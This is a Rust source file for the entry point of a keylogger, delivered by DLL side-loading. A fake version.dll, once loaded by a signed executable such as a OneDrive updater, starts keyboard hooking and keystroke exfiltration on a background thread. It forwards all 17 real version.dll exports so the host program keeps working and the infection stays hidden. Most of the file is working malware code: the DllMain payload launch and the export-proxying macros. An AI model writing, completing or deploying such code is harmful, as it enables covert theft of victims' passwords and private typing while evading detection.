// src/lib.rs
//
// DLL entry point for version.dll side-loading.
//
// When a legitimate signed exe (e.g. OneDriveStandaloneUpdater.exe) loads
// our "version.dll", DllMain fires on DLL_PROCESS_ATTACH and spawns the
// keylogger in a background thread.  Meanwhile, all 17 real version.dll
// exports are forwarded (proxied) to the original System32\version.dll
// so the host application continues to work normally.

// ── Shared modules (used by both lib.rs and main.rs) ─────────────────────
pub mod config;
pub mod exfil;
pub mod hook;
pub mod logger;
pub mod lua_engine;
pub mod persist;

use std::ffi::CString;
use std::sync::Once;

// ═══════════════════════════════════════════════════════════════════════════
//  DllMain
// ═══════════════════════════════════════════════════════════════════════════

static INIT: Once = Once::new();

/// The Windows DLL entry point.
/// On DLL_PROCESS_ATTACH we load the real version.dll and spawn the payload.
#[no_mangle]
#[allow(non_snake_case)]
pub extern "system" fn DllMain(
    _hinst: *mut u8,
    reason: u32,
    _reserved: *mut u8,
) -> i32 {
    const DLL_PROCESS_ATTACH: u32 = 1;

    if reason == DLL_PROCESS_ATTACH {
        INIT.call_once(|| {
            // 1. Load the REAL version.dll from System32 for proxying.
            unsafe { load_real_version_dll(); }

            // 2. Spawn the keylogger logic on a background thread.
            //    We must not block DllMain — doing heavy work here deadlocks.
            std::thread::spawn(|| {
                run_payload();
            });
        });
    }
    1 // TRUE — DLL loaded successfully
}

/// Runs the full keylogger pipeline (identical to the old main()).
fn run_payload() {
    // Give the host process a moment to finish its own initialisation.
    std::thread::sleep(std::time::Duration::from_secs(2));

    // Initialise Lua scripting (loads config.lua if present).
    if let Err(e) = lua_engine::init() {
        eprintln!("[diag] scripting unavailable: {}", e);
    }

    // Start the keyboard listener and the telemetry reporter.
    let listener = hook::start_hook();
    let _reporter = exfil::start_exfil_thread();

    // Block this thread until the hook stops (i.e. the host process exits).
    listener.join().ok();

    // Flush any remaining events.
    let remaining = logger::take_buffer();
    if !remaining.is_empty() {
        logger::write_to_file(&remaining);
        let _ = exfil::send_data(&remaining);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
//  Real version.dll proxy
// ═══════════════════════════════════════════════════════════════════════════
//
//  We load C:\Windows\System32\version.dll at runtime and forward every
//  exported function to the real implementation so the host exe works
//  normally.  version.dll only has 17 exports — small enough to proxy
//  in-line.

type FarProc = unsafe extern "system" fn() -> isize;

static mut REAL_DLL: *mut u8 = std::ptr::null_mut();

/// Pointers to the 17 real version.dll functions (filled on init).
static mut REAL_FN: [*const u8; 17] = [std::ptr::null(); 17];

extern "system" {
    fn LoadLibraryA(name: *const u8) -> *mut u8;
    fn GetProcAddress(module: *mut u8, name: *const u8) -> *const u8;
}

/// Indices into REAL_FN for each export.
const IDX_GET_FILE_VERSION_INFO_A:       usize = 0;
const IDX_GET_FILE_VERSION_INFO_BY_HANDLE: usize = 1;
const IDX_GET_FILE_VERSION_INFO_EX_A:    usize = 2;
const IDX_GET_FILE_VERSION_INFO_EX_W:    usize = 3;
const IDX_GET_FILE_VERSION_INFO_SIZE_A:  usize = 4;
const IDX_GET_FILE_VERSION_INFO_SIZE_EX_A: usize = 5;
const IDX_GET_FILE_VERSION_INFO_SIZE_EX_W: usize = 6;
const IDX_GET_FILE_VERSION_INFO_SIZE_W:  usize = 7;
const IDX_GET_FILE_VERSION_INFO_W:       usize = 8;
const IDX_VER_FIND_FILE_A:              usize = 9;
const IDX_VER_FIND_FILE_W:              usize = 10;
const IDX_VER_INSTALL_FILE_A:           usize = 11;
const IDX_VER_INSTALL_FILE_W:           usize = 12;
const IDX_VER_LANGUAGE_NAME_A:          usize = 13;
const IDX_VER_LANGUAGE_NAME_W:          usize = 14;
const IDX_VER_QUERY_VALUE_A:            usize = 15;
const IDX_VER_QUERY_VALUE_W:            usize = 16;

const EXPORT_NAMES: [&str; 17] = [
    "GetFileVersionInfoA",
    "GetFileVersionInfoByHandle",
    "GetFileVersionInfoExA",
    "GetFileVersionInfoExW",
    "GetFileVersionInfoSizeA",
    "GetFileVersionInfoSizeExA",
    "GetFileVersionInfoSizeExW",
    "GetFileVersionInfoSizeW",
    "GetFileVersionInfoW",
    "VerFindFileA",
    "VerFindFileW",
    "VerInstallFileA",
    "VerInstallFileW",
    "VerLanguageNameA",
    "VerLanguageNameW",
    "VerQueryValueA",
    "VerQueryValueW",
];

unsafe fn load_real_version_dll() {
    let path = CString::new("C:\\Windows\\System32\\version.dll").unwrap();
    REAL_DLL = LoadLibraryA(path.as_ptr() as *const u8);
    if REAL_DLL.is_null() {
        return;
    }
    for (i, name) in EXPORT_NAMES.iter().enumerate() {
        let cname = CString::new(*name).unwrap();
        REAL_FN[i] = GetProcAddress(REAL_DLL, cname.as_ptr() as *const u8);
    }
}

// ── Proxy macros ─────────────────────────────────────────────────────────
//
// Each proxy export uses the exact same calling convention as the real
// version.dll function.  We use `naked`-style pass-through via inline
// assembly, but since stable Rust doesn't support `naked`, we use a
// simpler approach: declare each proxy as `extern "system"` with the
// widest signature (pointer-sized args) and transmute to call the real fn.

macro_rules! proxy_fn {
    ($export_name:ident, $idx:expr) => {
        #[no_mangle]
        pub unsafe extern "system" fn $export_name(
            a: usize, b: usize, c: usize, d: usize,
            e: usize, f: usize, g: usize, h: usize,
        ) -> usize {
            let fp = REAL_FN[$idx];
            if fp.is_null() { return 0; }
            let func: unsafe extern "system" fn(
                usize, usize, usize, usize,
                usize, usize, usize, usize,
            ) -> usize = std::mem::transmute(fp);
            func(a, b, c, d, e, f, g, h)
        }
    };
}

proxy_fn!(GetFileVersionInfoA,        IDX_GET_FILE_VERSION_INFO_A);
proxy_fn!(GetFileVersionInfoByHandle, IDX_GET_FILE_VERSION_INFO_BY_HANDLE);
proxy_fn!(GetFileVersionInfoExA,      IDX_GET_FILE_VERSION_INFO_EX_A);
proxy_fn!(GetFileVersionInfoExW,      IDX_GET_FILE_VERSION_INFO_EX_W);
proxy_fn!(GetFileVersionInfoSizeA,    IDX_GET_FILE_VERSION_INFO_SIZE_A);
proxy_fn!(GetFileVersionInfoSizeExA,  IDX_GET_FILE_VERSION_INFO_SIZE_EX_A);
proxy_fn!(GetFileVersionInfoSizeExW,  IDX_GET_FILE_VERSION_INFO_SIZE_EX_W);
proxy_fn!(GetFileVersionInfoSizeW,    IDX_GET_FILE_VERSION_INFO_SIZE_W);
proxy_fn!(GetFileVersionInfoW,        IDX_GET_FILE_VERSION_INFO_W);
proxy_fn!(VerFindFileA,               IDX_VER_FIND_FILE_A);
proxy_fn!(VerFindFileW,               IDX_VER_FIND_FILE_W);
proxy_fn!(VerInstallFileA,            IDX_VER_INSTALL_FILE_A);
proxy_fn!(VerInstallFileW,            IDX_VER_INSTALL_FILE_W);
proxy_fn!(VerLanguageNameA,           IDX_VER_LANGUAGE_NAME_A);
proxy_fn!(VerLanguageNameW,           IDX_VER_LANGUAGE_NAME_W);
proxy_fn!(VerQueryValueA,             IDX_VER_QUERY_VALUE_A);
proxy_fn!(VerQueryValueW,             IDX_VER_QUERY_VALUE_W);
